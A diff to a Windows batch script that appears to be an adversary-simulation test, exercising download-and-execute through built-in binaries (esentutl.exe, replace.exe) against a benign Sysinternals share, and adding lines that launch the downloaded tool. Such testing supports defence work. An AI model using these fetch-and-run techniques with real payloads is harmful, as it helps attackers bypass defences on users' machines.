@@ -131,11 +131,13 @@ diskshadow.exe /s diskshadow.txt
 
 echo "[+] TXXXX - Testing Esentutl.exe download"
 
-esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o     
+esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o  
+start "" adrestore.exe   
 
 echo "[+] TXXXX - Testing replace.exe download"
 
-replace \\live.sysinternals.com\tools\adrestore.exe adrestore.exe /A
+replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
+start "" adrestore2.exe   
 
 echo "[+] TXXXX - Testing SyncAppvPublishingServer.vbs download & exec"
 
@@ -176,4 +178,5 @@ del diskshadow.txt
 del adrestore.exe
 del Default_File_Path.ps1
 del trace.etl
+del adrestore2.exe
 
